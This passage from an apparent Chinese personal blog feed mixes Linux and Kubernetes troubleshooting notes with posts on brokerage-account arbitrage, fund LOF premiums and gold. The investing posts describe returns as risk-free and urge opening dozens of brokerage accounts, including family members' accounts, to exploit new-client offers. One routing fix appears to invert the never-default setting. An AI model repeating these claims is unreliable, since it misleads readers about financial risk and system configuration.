<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ll /var/snap/microk8s/3699/var/kubernetes/backend</span><br><span class="line">total 153212</span><br><span class="line">-rw-rw---- 1 root microk8s 8381624 Jan 28 00:11 0000000014225187-0000000014225660</span><br><span class="line">-rw-rw---- 1 root microk8s 8386880 Jan 28 00:12 0000000014225661-0000000014226264</span><br><span class="line">-rw-rw---- 1 root microk8s 8386016 Jan 28 00:16 0000000014226265-0000000014226628</span><br><span class="line">-rw-rw---- 1 root microk8s 8381552 Jan 28 00:16 0000000014226629-0000000014227272</span><br><span class="line">-rw-rw---- 1 root microk8s 8378744 Jan 28 00:19 0000000014227273-0000000014227706</span><br><span class="line">-rw-rw---- 1 root microk8s 8362544 Jan 28 00:21 0000000014227707-0000000014228257</span><br><span class="line">-rw-rw---- 1 root microk8s 8377520 Jan 28 00:23 0000000014228258-0000000014228788</span><br><span class="line">-rw-rw---- 1 root microk8s 8386592 Jan 28 00:26 0000000014228789-0000000014229217</span><br><span class="line">-rw-rw---- 1 root microk8s 8368952 Jan 28 00:26 0000000014229218-0000000014229857</span><br><span class="line">-rw-rw---- 1 root microk8s 8361608 Jan 28 00:30 0000000014229858-0000000014230224</span><br><span class="line">-rw-rw---- 1 root microk8s 8387384 Jan 28 00:31 0000000014230225-0000000014230835</span><br><span class="line">-rw-rw---- 1 root microk8s 8377232 Jan 28 00:34 0000000014230836-0000000014231305</span><br><span class="line">-rw-rw---- 1 root microk8s 8387384 Jan 28 00:36 0000000014231306-0000000014231802</span><br><span class="line">-rw-rw---- 1 root microk8s 8373272 Jan 28 00:37 0000000014231803-0000000014232388</span><br><span class="line">-rw-rw---- 1 root microk8s 8384512 Jan 28 00:41 0000000014232389-0000000014232597</span><br><span class="line">-rw-rw---- 1 root microk8s      80 Jan 28 00:40 0000000014232598-0000000014232598</span><br><span class="line">-rw-rw---- 1 root microk8s    1883 Dec 14 03:38 cluster.crt</span><br><span class="line">-rw-rw---- 1 root microk8s    3272 Dec 14 03:38 cluster.key</span><br><span class="line">-rw-rw---- 1 root microk8s      63 Feb  4 03:11 cluster.yaml</span><br><span class="line">-rw-rw-r-- 1 root microk8s       2 Feb  4 03:12 failure-domain</span><br><span class="line">-rw-rw---- 1 root microk8s      57 Dec 14 03:38 info.yaml</span><br><span class="line">-rw-rw-r-- 1 root microk8s       0 Feb  2 10:24 kine.sock</span><br><span class="line">-rw-rw---- 1 root microk8s      63 Dec 19 07:56 localnode.yaml</span><br><span class="line">-rw-rw---- 1 root microk8s      32 Dec 14 03:38 metadata1</span><br><span class="line">-rw-rw---- 1 root microk8s 8388608 Jan 28 00:41 open-28053</span><br><span class="line">-rw-rw---- 1 root microk8s 8388608 Jan 28 00:41 open-28054</span><br><span class="line">-rw-rw---- 1 root microk8s 8388608 Jan 28 00:45 open-28055</span><br><span class="line">-rw-rw---- 1 root microk8s 3069878 Jan 28 00:40 snapshot-1-14232647-3429895302</span><br><span class="line">-rw-rw---- 1 root microk8s      72 Jan 28 00:40 snapshot-1-14232647-3429895302.meta</span><br><span class="line">-rw-rw---- 1 root microk8s 2893883 Jan 28 00:43 snapshot-1-14233671-3430050282</span><br><span class="line">-rw-rw---- 1 root microk8s      72 Jan 28 00:43 snapshot-1-14233671-3430050282.meta</span><br></pre></td></tr></table></figure>
<p>每个文件的作用：</p>
<ul>
<li>数据段文件（如：0000000014225187-0000000014225660）：<br>这些文件包含 dqlite 存储的实际数据段。每个文件代表一个数据段，存储着相应的数据。这些文件在 dqlite 数据库引擎中用于持久性地存储数据。</li>
<li>索引段文件（如：0000000014225661-0000000014226264）：<br>类似于数据段文件，这些文件包含 dqlite 存储的索引段，用于加速数据检索。</li>
<li>快照文件（如：snapshot-1-14232647-3429895302）：<br>这些文件包含数据库在某个时间点的快照，用于还原数据库状态。在备份和还原过程中，这些文件可能会用到。</li>
<li>信息文件（info.yaml）：<br>这是一个 YAML 格式的文件，包含有关 dqlite 数据库的一些元信息。</li>
<li>配置文件（cluster.yaml）：<br>包含 dqlite 集群的配置信息，例如节点地址、端口等。</li>
<li>证书文件（cluster.crt、cluster.key）：<br>这是用于在 dqlite 集群中进行安全通信的证书文件。</li>
<li>本地节点配置文件（localnode.yaml）：<br>包含本地节点的配置信息，例如节点 ID。</li>
<li>元数据文件（metadata1）：<br>存储 dqlite 内部使用的一些元数据信息。</li>
<li>打开文件（如：open-28055）：<br>这些文件可能是当前正在使用的打开文件。它们通常在 dqlite 服务正在运行时存在。</li>
<li>失败域文件（failure-domain）：<br>可能包含关于节点失败域的信息，用于高可用性和容错。</li>
</ul>
<h2><span id="参考">参考</span></h2><p><a href="https://discuss.linuxcontainers.org/t/error-failed-to-start-dqlite-server-raft-start/6931">https://discuss.linuxcontainers.org/t/error-failed-to-start-dqlite-server-raft-start/6931</a></p>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>股票账户除了炒股还能做什么?</title>
    <url>/2024/0331201904.html</url>
    <content><![CDATA[<p>除了炒股，股票账户还有哪些功能？开股票账户是不是和去赌场赌博是一回事？股票账户有靠谱的赚钱手艺吗？</p>
<p>我的回答是：<strong>股票账户当然能赚钱，而且股票账户的功能非常丰富，可以是说现代投资理财必备工具</strong>。下面我介绍几个我常用的低风险投资工具，供大家参考：</p>
<span id="more"></span>

<h2><span id="1-购买国债逆回购-货币基金等短期资金管理工具">1. 购买国债逆回购、货币基金等短期资金管理工具</span></h2><p>我通常把3年内可能会用掉的钱看作短期资金，这部分钱只能投入到流动性好，风险极低的资产。我最常用的短期资金管理工具是国债逆回购和货币基金：</p>
<h3><span id="国债逆回购">国债逆回购</span></h3><ul>
<li>逆回购本质是一种短期贷款，你把钱借给别人获得固定的利息收益，别人用自己的国债作为抵押获得这笔借款，到期还本付息，逆回购的安全性等同于国债。</li>
<li>逆回购的流动性好，可根据自己需要选择1天，2天，3天，4天等不同期限。</li>
<li>在月末季末等资金面紧张的时候，逆回购收益率较高。</li>
<li>在节前倒数第二个交易日购买1天期逆回购，资金只占用1天，可以获得整个节日期间的利息。<br><img data-src="/2024/0331201904/image1.png"></li>
</ul>
<h3><span id="货币基金">货币基金</span></h3><ul>
<li>货币基金主要投资于国债、央行票据等风险极低的东西，安全性很强。货币基金的收益和逆回购相当。</li>
<li>我通常只买场内交易型货币基金，有两点好处：日内可以随时买入卖出，如果急用钱当天卖出下一个交易日就能取现；价格和净值出现偏离时可以套利。</li>
<li>逆回购搭配“算头不算尾”的场内货币基金，可以实现用7天时间赚9天收益。篇幅所限不展开讨论，有兴趣朋友可自行搜索原理。</li>
</ul>
<h2><span id="2-购买券商新客理财">2. 购买券商新客理财</span></h2><p>券商新客理财是券商给新客户发行的一种短期理财产品，以质押式报价回购和收益凭证为主。本质上是证券公司向你借钱，投向风险极低的品种，投资期限一般在14天到1个月，约定到期收益6%-8%，说白了就是券商为了拉新倒贴你钱。<br><img data-src="/2024/0331201904/image2.png"><br>思考题：只有新客户才能买新客理财，一次只能享受14天到1个月的利息，你该如何放大这个收益？</p>
<p>答：你完全可以(用家人的账户)继续购买。如果你不想麻烦家人开户，你一个人也可以开多个证券公司的账户，注意这里的多不是3个5个，而是30个50个甚至100多个，理论上全国有多少券商你就可以开多少个~</p>
<p>要解释这个神奇的BUG，你需要了解<strong>不限三</strong>的概念：<strong>不限制深A股东号，超过三户之后你可以接着开第四家，只需在开户时勾选“转户深A”，即可无限复制深A号，实现无尽开户的概念</strong>。</p>
<p>总结下，券商新客理财适合20万以内的小资金，没必要去瞎炒什么股票，每个月去开户就完事了，稳拿6%-8%收益，再加上券商开户返利，年化10-20%很容易。你只要不嫌麻烦，就能站着把这钱挣了。</p>
<h2><span id="3-做基金套利">3. 做基金套利</span></h2><p>关于基金套利的原理，简单说就是<strong>从价格低的市场买入，然后到价格高的市场卖出，赚取差价，就像勤劳的搬砖工一样</strong>。</p>
<p>今年短短3个月时间里，出现了非常多的基金套利机会，比如印度基金LOF，全球芯片LOF，标普500LOF，给了我实践套利机会的同时，还顺便让我捡了几千块钱~</p>
<p>至于下一次套利机会什么时候出现，谁也不知道。我们能做的就是提前把工具准备好，多开几个拖拉机户，下次在地上看到钱了，弯个腰，把它捡起来。</p>
<h2><span id="4-可转债打新">4. 可转债打新</span></h2><p>关于可转债是什么，大家可自行搜索。可转债打新几乎是一门稳赚不赔的手艺，单账户一年期望收益在1000元左右，你自己的再加上父母老婆兄弟姐妹的，一年搞个五六千的无风险收益不难。你只需要做到每次新债不漏申，中签要缴款，有手就行，属于白送的钱。</p>
<p>现在可转债新规，要求2年股票交易经验+10万元资产的参与门槛，我只能说赚钱要趁早。<strong>刚开户的朋友务必记得买卖一手股票(推荐600022)刷下交易经验，等2年时间一到就准备开始捡钱。</strong></p>
<p>想学习可转债的朋友，我推荐以下这几本我看过的书：</p>
<ul>
<li>《攻守：可转债投资实用手册》作者：饕餮海&#x2F;定风波&#x2F;优美</li>
<li>《可转债投资黄金宝典》作者：阿秋</li>
<li>《可转债投资魔法书》作者：安道全</li>
</ul>
]]></content>
      <categories>
        <category>investment</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux双网卡默认路由优先级不正确，导致网络不通问题定位</title>
    <url>/2024/0410202218.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p>RHEL9 双网卡环境，两个网卡配置如下：(<strong>eth0 走内网，eth1 走外网</strong>)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eth0  192.168.10.20/24     网关: 192.168.10.254</span><br><span class="line">eth1  10.206.216.92/24     网关: 10.206.216.254</span><br></pre></td></tr></table></figure>
<p>配置完成后，<code>curl https://www.baidu.com</code>访问百度失败，发现网络不通。</p>
<h2><span id="定位步骤">定位步骤</span></h2><span id="more"></span>
<p>使用<code>route</code>命令查路由表，发现eth0的默认路由Metric值为100，小于eth1的Metric(101)，这说明eth0默认路由优先级更高，**<code>curl https://www.baidu.com</code> 匹配的是eth0的默认路由，但我们需要通过eth1访问外网**，所以网络不通。<br><img data-src="/2024/0410202218/image1.png"></p>
<h2><span id="解决方法">解决方法</span></h2><p>有两种方法，任选其一即可</p>
<h3><span id="方法1-手动修改eth0默认路由的metric值需大于eth1">方法1: 手动修改eth0默认路由的metric值，需大于eth1</span></h3><p>以下命令设置eth0的默认路由metric值为200，大于eth1的默认路由metric(101)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmcli connection modify eth0 ipv4.route-metric 200</span><br><span class="line">nmcli c up eth0</span><br><span class="line">nmcli c reload</span><br></pre></td></tr></table></figure>
<p>修改重启后仍有效 (配置写在<code>/etc/NetworkManager/system-connections/eth0.nmconnection</code>)</p>
<h3><span id="方法2删除eth0的默认路由只保留eth1的默认路由">方法2：删除eth0的默认路由，只保留eth1的默认路由</span></h3><p>通过配置<code>ipv4.never-default=no</code>，删除eth0网卡的默认路由，参考如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmcli c mod eth0 ipv4.never-default no gw4 192.168.10.254</span><br><span class="line">nmcli c up eth0</span><br><span class="line">nmcli c reload</span><br></pre></td></tr></table></figure>
<p>修改重启后仍有效 (配置写在<code>/etc/NetworkManager/system-connections/eth0.nmconnection</code>)</p>
<h2><span id="参考">参考</span></h2><p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/managing-the-default-gateway-setting_configuring-and-managing-networking">Red Hat Customer Portal – Chapter 23. Managing the default gateway setting</a></p>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>troubleshooting</tag>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>Shell函数中使用echo返回了错误字符串问题定位</title>
    <url>/2024/0412202433.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p>在Vmware虚拟机上，执行如下Shell代码获取VM类型</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">get_VM_infra</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> infra=$(dmidecode -t system | grep <span class="string">&quot;Manufacturer&quot;</span>)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$infra</span>&quot;</span> | grep <span class="string">&quot;VMware&quot;</span> <span class="comment"># 判断VM平台类型是否为VMware</span></span><br><span class="line">    <span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;VMware&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Other Type&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">infra=$(get_VM_infra)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;infra: <span class="variable">$infra</span>&quot;</span></span><br></pre></td></tr></table></figure>
<p>预期返回<code>&quot;VMware&quot;</code>，实际返回<code>&quot;Manufacturer: VMware, Inc.\nVMware&quot;</code>，这个返回的结果是错误的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># infra:  Manufacturer: VMware, Inc.</span><br><span class="line"># VMware</span><br></pre></td></tr></table></figure>
<h2><span id="原因分析">原因分析</span></h2><span id="more"></span>
<p>问题出在<code>echo &quot;$infra&quot; | grep &quot;VMware&quot;</code>，<strong>这行代码判断虚拟机类型的时候，也使用了echo，导致返回的字符串多了一行</strong>(Manufacturer: VMware, Inc.)。</p>
<h2><span id="解决方法">解决方法</span></h2><p>方法1：<br><code>echo &quot;$infra&quot; | grep &quot;VMware&quot;</code> 改成 <code>echo &quot;$infra&quot; | grep &quot;VMware&quot; &gt; /dev/null 2&gt;&amp;1</code></p>
<p>方法2:<br>直接定义全局变量保存字符串，回避echo语句的副作用</p>
<h2><span id="参考">参考</span></h2><p><a href="https://linuxsimply.com/bash-scripting-tutorial/functions/return-values/return-string-function/">How to Return String From Bash Function</a></p>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>投资组合中是否应该包括黄金</title>
    <url>/2024/0413202714.html</url>
    <content><![CDATA[<p>最近有朋友问我，你对黄金怎么看？现在可以买黄金吗？</p>
<p>这些问题问的很好啊。首先表明我的观点：<font color="red"><strong>黄金是投机不是投资，黄金的长期投资价值极低</strong></font>，在我的投资组合中配置黄金的比例不会超过5%。</p>
<p>可能有些朋友会反对：你谁啊，一句话把黄金贴个投机的标签，我几年前300多元一克买的黄金放到现在已经赚麻了，你懂不懂黄金啊？</p>
<p>的确，构建投资组合时是否应包含黄金，是一个备受争议的话题。下面我分别给出买黄金和不买黄金的理由，供大家参考。</p>
<span id="more"></span>

<h2><span id="配置黄金的理由">配置黄金的理由</span></h2><p><strong>1. 避险保值，抵御通胀</strong></p>
<p>黄金作为一种避险资产，在经济不稳定或通胀预期上升时往往表现较好，有对冲货币贬值的作用。</p>
<p>你买的股票可能会破产，债券可能会违约，但是黄金的价格不会跌到零。</p>
<p><strong>2. 资产多样化，降低投资组合风险</strong></p>
<p>黄金的价格和股票、债券相关性低。<font color="red"><strong>将投资组合分散到黄金、债券、股票等几种不相关的资产中，可以在不牺牲预期收益的同时降低风险，从而获得一份”免费的午餐”</strong></font>，这就是著名的资产配置理论。</p>
<p>对资产配置感兴趣的朋友，我推荐威廉·伯恩斯坦的《有效资产管理》，值得反复阅读。</p>
<h2><span id="不配置黄金的理由">不配置黄金的理由</span></h2><p><strong>1. 本身没有内在回报，其回报基于博傻</strong></p>
<p>我们知道，投资股票有红利收入，债券有利息收入，房地产有租金收入，这些都是生息资产，可以创造现金流。</p>
<p>但是黄金属于不创造现金流的资产，本身没有内在回报，难以估值，就像古董，字画一样，其回报只能基于博傻，指望别人出更高的价格接你的盘。</p>
<p><font color="red"><strong>投资和投机最大的区别在于，你需要预测的对象是内在回报还是市场情绪。</strong></font>从这个角度看，我认为黄金仅有投机价值，而投机想要获利，你就必须正确预测市场情绪，预判他人的行为，这是远远超出我能力圈的事情，我不会参与这种游戏。</p>
<p><strong>2. 风险溢价几乎为零</strong></p>
<p>风险溢价（Risk premium）指的是投资者在一段时间内持有风险资产的预期回报率相对于无风险资产的超额回报率。</p>
<p>杰里米·西格尔教授在他的经典之作《股市长线法宝》(Stocks for the long run)中，给出了各资产在1802-2012年的真实收益：<br><img data-src="/2024/0413202714/image1.png"><br>可以看出，在210年的时间内，<font color="red"><strong>一个充分分散的股票投资组合的年平均真实收益率为6.6%，短期债券为2.7%, 而黄金的真实收益率仅有0.7%，风险溢价几乎是零</strong></font>。</p>
<p>也就是说，投资者持有黄金，承担了和股票类似的价格波动，但回报远不如股票，甚至不如无风险的短期国债。那我不如持有无风险的短期国债，既获得了和黄金类似的回报，又不用承担价格波动的风险，何乐不为呢？</p>
<p>行文至此，对于仍然想要配置黄金的朋友，我建议不要着急，先思考下面几个问题，想明白了再买不迟：</p>
<ul>
<li>我的投资周期到底有多长？</li>
<li>我需要配置多少比例的黄金？</li>
<li>我最多可以忍受多少幅度的下跌？</li>
<li>如何设置止损和止盈？</li>
</ul>
<p>只有事先想清楚这些问题，谋定而后动，才能做出理性的投资决策。</p>
]]></content>
      <categories>
        <category>investment</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>又来！黄金主题LOF溢价40个点开放申购，拖拉机都开冒烟了！</title>
    <url>/2024/0421203823.html</url>
    <content><![CDATA[<p>查看基金公告，黄金主题LOF(161116)下周一(4月22号)开放申购，限额100元，目前溢价40%，可以一拖七套利。</p>
<span id="more"></span>
<p><img data-src="/2024/0421203823/image1.png"></p>
<p>这熟悉的配方，这熟悉的套路！一个月前的今天，我好像在标普500LOF上见过。又是易方达这个狗基，又是限额100元溢价40%，历史总是惊人的相似！</p>
<p>目前全球股市暴跌，中东战乱纷飞，避险情绪强烈，黄金的热度怕是一时半会下不去喽。我算了下，40%的溢价可以扛住3个跌停，限购100元出货压力不大，仓位很低，这个胜率和赔率值得参与。</p>
<p>还记得一周前，我写了篇文章，表示自己不会买黄金这种博傻玩意，现在只能说脸被打的有点疼！架不住易方达这么会玩，场内的雷锋这么热情，我只能说两个字，真香！</p>
<p><img data-src="/2024/0421203823/image2.png"></p>
<p>不明白什么是一拖七的朋友，可以看我的历史文章。<strong>凡是能够赚钱的手艺，我建议大家要花点时间去自学一下的。几个小时就可以学会的东西，一年捡个几千块钱，不香吗？</strong></p>
]]></content>
      <categories>
        <category>investment</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>掌握夜市委托，出货快人一步</title>
    <url>/2024/0519204136.html</url>
    <content><![CDATA[<p>4月22日，黄金LOF（161116）开放申购，限额100元，场内溢价42%，22日场内申购的份额在25日可以卖出。</p>
<span id="more"></span>

<p><img data-src="/2024/0519204136/image1.png"></p>
<p>4月25日，场内新增的申购份额有3318万份，但成交额只有228万，只有不到10%的套利党成功出货。我当天成功出掉一组拖拉机，直接白捡 (1.099-0.924)&#x2F;0.924<em>100</em>7&#x3D;132元</p>
<p>那么，如何成为这顺利吃肉的10%呢？这里我给大家分享两个知识点，教大家今后如何在赌场里捞这种钱。</p>
<h2><span id="1-利用夜市委托规则提前占座">1. 利用夜市委托规则，提前占座</span></h2><p>首先，我们要明白A股的交易规则是“价格优先，时间优先”。<font color="red"><strong>价格优先意味着低价卖出的申报会优先成交；而时间优先则意味着在价格相同时，谁挂单早谁就先成交。</strong></font></p>
<p><strong>那么，什么是夜市委托呢？简单说，就是在前一个交易日晚上清算后，提前进行第二个交易日的委托</strong>。这样，你就可以在其他人还在睡梦中时，就已经占好了位置，等待开盘后的成交。</p>
<p>夜市委托的开始时间因券商而异，以我常用的华B来说，通常在前一个交易日的17点30分左右开始。</p>
<p>接下来，以黄金LOF（161116）为例，来说说夜市委托的具体操作：</p>
<ul>
<li><p>在24日19点左右（具体时间因券商而异）, 你能查到22日申购的份额到达持仓, 成本价0.924。<font color="red">*<em>到达持仓后立刻挂跌停单，跌停价为24日收盘价1.221的90%，再四舍五入到小数点后三位。比如, 1.221</em>0.9&#x3D;1.0989，你的卖出价就设为1.099</font>**。注意，这里价格千万不能输错，多一分钱你卖不掉，少一分钱算无效单！</p>
</li>
<li><p><font color="red"><strong>在25日14点57分前，手动撤掉所有未卖出的委托单。等到17点30分，找一个安静的地方坐下来，拿出手机，使出单身二十多年的手速，疯狂刷跌停单，跌停价输入1.099*0.9&#x3D;0.989</strong></font>。直到系统不再提示”此时间段不允许委托”，再把其他账号一个个全都挂上去。</p>
</li>
</ul>
<h2><span id="2-选择不拥挤的券商人多的地方你别去">2. 选择不拥挤的券商，人多的地方你别去</span></h2><p>某些网红券商因为聚集了大量的套利用户，交易通道极其拥堵，出货机会渺茫。根据朋友们的反馈，用了华B的很多都顺利出货了，而用了YH的很多都没跑掉。如果你没有跑掉，那再高的溢价都是镜花水月，你的所有操作，就是白忙活，纯纯给券商贡献利润。</p>
<h2><span id="最后做个交易记录小结">最后做个交易记录小结</span></h2><p>4.22日起连续申购3天，到4.29日全部卖出，盈利合计252元。<br><img data-src="/2024/0519204136/image2.png"></p>
]]></content>
      <categories>
        <category>investment</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>iptables规则转换为nftables的方法</title>
    <url>/2024/0521205000.html</url>
    <content><![CDATA[<p>使用预装的<code>iptables-translate</code>程序即可，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># iptables-translate -A INPUT -p icmp --icmp-type time-exceeded -j ACCEPT</span></span><br><span class="line">nft add rule ip filter INPUT icmp <span class="built_in">type</span> time-exceeded counter accept</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<p><code>nftables</code>默认没有内置的链，可以自己新增</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nft flush ruleset</span><br><span class="line">nft add table ip filter</span><br><span class="line">nft flush chain ip filter INPUT</span><br><span class="line">nft add chain ip filter INPUT <span class="string">&quot;&#123;type filter hook input priority 0; policy drop; &#125;&quot;</span></span><br><span class="line">nft add chain ip filter OUTPUT <span class="string">&quot;&#123;type filter hook output priority 0; policy accept; &#125;&quot;</span></span><br><span class="line">nft add chain ip filter FORWARD <span class="string">&quot;&#123;type filter hook forward priority 0; policy accept; &#125;&quot;</span></span><br><span class="line">nft list ruleset</span><br></pre></td></tr></table></figure>
<h2><span id="参考">参考</span></h2><ul>
<li><a href="https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux/9/html/configuring_firewalls_and_packet_filters/getting-started-with-nftables_firewall-packet-filters">https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux&#x2F;9&#x2F;html&#x2F;configuring_firewalls_and_packet_filters&#x2F;getting-started-with-nftables_firewall-packet-filters</a></li>
<li><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9/html/configuring_firewalls_and_packet_filters/getting-started-with-nftables_firewall-packet-filters#supported-nftables-script-formats_writing-and-executing-nftables-scripts">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux&#x2F;9&#x2F;html&#x2F;configuring_firewalls_and_packet_filters&#x2F;getting-started-with-nftables_firewall-packet-filters#supported-nftables-script-formats_writing-and-executing-nftables-scripts</a></li>
</ul>
]]></content>
      <categories>
        <category>iptables</category>
      </categories>
      <tags>
        <tag>iptables</tag>
      </tags>
  </entry>
  <entry>
    <title>Microk8s启动失败，Failed to start Service for snap application microk8s.daemon-containerd 问题定位</title>
    <url>/2024/0521204320.html</url>
    <content><![CDATA[<h2><span id="测试环境">测试环境</span></h2><p>VMware Rocky Linux 9.3 x86_64</p>
<h2><span id="问题描述">问题描述</span></h2><p>microk8s启动失败，microk8s.daemon-containerd服务启动失败，报“Failed to start Service for snap application microk8s.daemon-containerd”</p>
<h2><span id="定位过程">定位过程</span></h2><span id="more"></span>
<ol>
<li>敲<code>microk8s inspect</code>，检查相关service启动是否正常，发现snap.microk8s.daemon-containerd服务没有running.<br><img data-src="/2024/0521204320/image1.png"></li>
<li>敲<code>journal -u snap.microk8s.daemon-containerd</code>，查看服务启动失败原因：<br><img data-src="/2024/0521204320/image2.png"></li>
<li>观察上面的journal日志发现，microk8s.daemon-containerd反复尝试获取默认路由失败，因此怀疑是网卡配置有问题，敲<code>route</code>发现路由表为空，敲<code>ifconfig</code>发现主网卡没有配置IP地址。<br><img data-src="/2024/0521204320/image3.png"></li>
<li>检查VMware虚拟机设置，找到网卡没有IP地址原因：主网卡没有<strong>connect</strong><br><img data-src="/2024/0521204320/image4.png"></li>
</ol>
<h2><span id="解决方法">解决方法</span></h2><p>Vmware VM设置里勾选网卡状态为connect，再设置主网卡IP, Gateway, DNS，重启microk8s问题解决。<br>配置网卡使用<code>nmcli</code>命令，方法如下：</p>
<ul>
<li>修改已存在的connection<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmcli con mod eth0 ipv4.addresses <span class="string">&quot;<span class="variable">$&#123;ip&#125;</span>&quot;</span></span><br><span class="line">nmcli con mod eth0 ipv4.dns <span class="string">&quot;<span class="variable">$&#123;dns&#125;</span>&quot;</span></span><br><span class="line">nmcli con mod eth0 ipv4.gateway <span class="string">&quot;<span class="variable">$&#123;gw&#125;</span>&quot;</span></span><br><span class="line">nmcli con up eth0</span><br><span class="line">nmcli c reload</span><br></pre></td></tr></table></figure></li>
<li>connection不存在，需要新增<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmcli con add con-name eth0 autoconnect <span class="built_in">yes</span>  <span class="built_in">type</span> ethernet ifname eth0 ipv4.method manual ip4 <span class="string">&quot;<span class="variable">$&#123;ip&#125;</span>&quot;</span> gw4 <span class="string">&quot;<span class="variable">$&#123;gw&#125;</span>&quot;</span> ipv4.dns <span class="string">&quot;<span class="variable">$&#123;dns&#125;</span>&quot;</span></span><br><span class="line">nmcli c up eth0</span><br><span class="line">nmcli c reload</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>如何在centos7上安装ansible</title>
    <url>/2024/0524205110.html</url>
    <content><![CDATA[<p>先安装python3, 再通过pip安装ansible，最后把ansible安装路径添加到环境变量PATH，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install python3 python3-pip</span><br><span class="line">pip3 install ansible --user</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/local/python3/bin</span><br></pre></td></tr></table></figure>
<p>检查安装是否成功</p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ansible --version</span><br><span class="line">ansible [core 2.15.12]</span><br><span class="line">  config file = None</span><br><span class="line">  configured module search path = [&#x27;/root/.ansible/plugins/modules&#x27;, &#x27;/usr/share/ansible/plugins/modules&#x27;]</span><br><span class="line">  ansible python module location = /usr/local/python3/lib/python3.9/site-packages/ansible</span><br><span class="line">  ansible collection location = /root/.ansible/collections:/usr/share/ansible/collections</span><br><span class="line">  executable location = /usr/local/python3/bin/ansible</span><br><span class="line">  python version = 3.9.12 (main, Oct 19 2022, 05:17:58) [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)] (/usr/local/bin/python3)</span><br><span class="line">  jinja version = 3.1.2</span><br><span class="line">  libyaml = True</span><br></pre></td></tr></table></figure>

<h2><span id="参考">参考</span></h2><p><a href="https://unix.stackexchange.com/questions/546578/failed-to-install-ansible-on-centos-8">https://unix.stackexchange.com/questions/546578/failed-to-install-ansible-on-centos-8</a></p>
]]></content>
      <categories>
        <category>ansible</category>
      </categories>
      <tags>
        <tag>ansible</tag>
      </tags>
  </entry>
  <entry>
    <title>k8s中的pod域名解析失败问题定位</title>
    <url>/2024/0612205430.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p>我在k8s中启动了一个Host网络模式的pod，这个pod的域名解析失败了。</p>
<h2><span id="定位步骤">定位步骤</span></h2><p>敲<code>kubectl  exec -it [pod_name] -- bash</code>进入pod后台，查看<code>/etc/resolv.conf</code>，发现nameserver配的有问题。<strong>这里我预期的nameserver应该使用宿主机的，但实际上用的是coredns的。</strong></p>
<span id="more"></span>
<p><img data-src="/2024/0612205430/image1.png"></p>
<p>再查看pod的dnsPolicy，发现dns策略为ClusterFirstWithHostNet，这个策略使得Host模式的Pod仍然使用k8s的dns；我需要使用宿主机的dns，所以需要把这个dns策略改为’Default’</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl -n sg-fps get deploy -o yaml | grep dnsPolicy</span><br><span class="line">        dnsPolicy: ClusterFirstWithHostNet</span><br></pre></td></tr></table></figure>

<p>通过<code>kubectl -n kube-system get cm/coredns -o yaml</code>查看coredns配置，发现coredns里配置的dnsserver为10.204.16.1，这个IP我也配错了，再加上之前pod里配的策略是ClusterFirstWithHostNet，这两个错误同时出现，导致pod域名解析失败。</p>
<p><img data-src="/2024/0612205430/image2.png"></p>
<h2><span id="解决方法">解决方法</span></h2><p>把Pod的dnsPolicy改成Default，k8s的四种DNS策略参考：<a href="https://aiops.com/news/post/12763.html">link</a></p>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
